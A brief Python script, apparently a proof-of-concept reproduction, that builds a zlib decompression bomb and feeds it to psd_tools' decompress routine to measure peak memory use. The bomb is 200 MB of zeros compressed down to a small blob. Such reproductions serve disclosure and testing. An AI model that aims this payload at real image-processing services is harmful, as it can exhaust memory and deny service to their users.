import zlib, tracemalloc
from psd_tools.compression import decompress
from psd_tools.constants import Compression

bomb = zlib.compress(b"\x00" * (200 * 1024 * 1024), 9)
print("compressed size:", len(bomb))
tracemalloc.start()
try:
    decompress(bomb, Compression.ZIP, 1, 1, 8)
except AssertionError as e:
    print("AssertionError:", str(e)[:60])
print("peak MB:", tracemalloc.get_traced_memory()[1] // 2**20)
